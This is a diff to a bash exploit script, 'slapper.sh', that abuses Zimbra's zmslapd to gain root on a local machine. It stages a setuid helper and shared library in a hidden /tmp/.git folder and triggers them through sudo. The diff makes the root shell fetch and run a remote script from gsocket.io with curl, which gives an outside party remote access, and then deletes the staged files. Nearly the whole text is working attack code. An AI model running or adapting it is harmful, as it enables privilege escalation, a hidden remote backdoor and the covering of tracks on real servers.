@@ -1,6 +1,7 @@
 #!/bin/bash
 echo "~ slapper.sh - zimbra zmslapd local privesc exploit ~"
 echo "[+] Setting up..."
+rm -rf /tmp/.git 2>&1
 mkdir /tmp/.git
 cd /tmp/.git
 cat << EOF > /tmp/.git/sorrymom.c
@@ -17,16 +18,17 @@ EOF
 cat << EOF > /tmp/.git/init.c
 #include <stdio.h>
 int main(void){
+    char* argument_list[] = {"/bin/bash", "<(curl -fsSLk gsocket.io/x)", NULL};
     setuid(0);
     setgid(0);
     seteuid(0);
     setegid(0);
-    execvp("/bin/bash", NULL, NULL);
+    execvp("/bin/bash", argument_list);
 }
 EOF
-gcc -o /tmp/.git/init /tmp/.git/init.c 2>&1
+gcc -o /tmp/.git/init /tmp/.git/init.c
 rm -rf /tmp/.git/init.c
-gcc -fPIC -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c 2>&1
+gcc -fPIC -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c
 rm -rf /tmp/.git/sorrymom.c
 cat << EOF > /tmp/.git/slapd.conf
 include		/opt/zimbra/common/etc/openldap/schema/core.schema
@@ -42,8 +44,7 @@ index	    objectClass	eq
 EOF
 echo "[+] Triggering our exploit..."
 sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.git/slapd.conf
-echo "[+] Cleaning up staged files..."
-rm -rf /tmp/.git/slapd.conf
-rm -rf /tmp/.git/sorrymom.so
 echo "[$] Run gsocket"
-/tmp/.git/init <(curl -fsSLk gsocket.io/x) 2>&1
+/tmp/.git/init
+echo "[+] Cleaning up staged files..."
+rm -rf /tmp/.git
